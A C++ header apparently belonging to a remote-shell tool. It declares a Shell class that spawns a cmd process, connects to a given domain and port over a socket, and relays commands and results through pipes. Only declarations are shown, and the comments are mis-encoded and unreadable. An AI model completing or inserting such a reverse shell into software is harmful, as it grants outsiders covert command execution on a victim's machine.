// ����cmd���� ͨ���ܵ��������������
// �����ܵ���ͬ��socket��hunter��
// ʹ��hunter���ܹ���cmd���̽���
// ʹ�õ���ģʽ

#pragma once
#include <strsafe.h>
#include "TcpSocket.h"
#include <string>

class Shell
{
public:
	// ������ں��� ����cmd���̲����ùܵ����� �������߳�
	static void startShell(std::string domain, int port);
	// �̺߳��� �����socket��ת�� ������������
	static DWORD WINAPI threadReadSock(LPVOID args);
	// ����cmd���Բ�����
	static void flushResults();
	// ����cmd�ӽ��̲�׼���ùܵ�
	static bool createCmd();
};

